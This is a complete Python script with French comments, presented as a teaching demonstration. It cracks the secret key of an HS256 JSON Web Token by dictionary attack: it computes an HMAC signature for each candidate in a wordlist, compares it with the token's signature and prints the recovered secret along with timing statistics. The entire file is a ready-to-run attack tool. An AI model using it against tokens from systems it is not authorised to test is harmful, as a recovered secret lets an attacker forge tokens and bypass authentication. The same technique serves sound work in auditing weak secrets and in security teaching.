#!/usr/bin/env python3
"""
Crack JWT HS256 par dictionnaire — démonstration pédagogique.
Usage : python3 crack.py <token> <wordlist>
"""
import base64, hmac, hashlib, sys, time

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def crack(token, wordlist_path):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] JWT invalide")
        return None

    h_b64, p_b64, s_b64 = parts
    signing_input = f"{h_b64}.{p_b64}".encode()
    target_sig = b64d(s_b64)

    print(f"[*] Token     : {token[:60]}...")
    print(f"[*] Wordlist  : {wordlist_path}")
    print(f"[*] Cible     : {target_sig.hex()[:32]}...\n")

    start = time.time()
    tested = 0

    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            for line in f:
                tested += 1
                candidate = line.strip().encode()
                sig = hmac.new(candidate, signing_input, hashlib.sha256).digest()

                if hmac.compare_digest(sig, target_sig):
                    elapsed = time.time() - start
                    rate = tested / elapsed if elapsed > 0 else 0
                    print(f"\n[+] ✅ SECRET TROUVÉ : {candidate.decode()}")
                    print(f"[+] Testé {tested} candidats en {elapsed:.2f}s")
                    print(f"[+] Vitesse : {rate:,.0f} essais/seconde")
                    return candidate.decode()

                if tested % 100_000 == 0:
                    print(f"    {tested:,} essais...")
    except FileNotFoundError:
        print(f"[!] Fichier introuvable : {wordlist_path}")
        return None

    print(f"\n[-] Pas trouvé après {tested:,} essais")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage : python3 crack.py <token> <wordlist>")
        sys.exit(1)
    crack(sys.argv[1], sys.argv[2])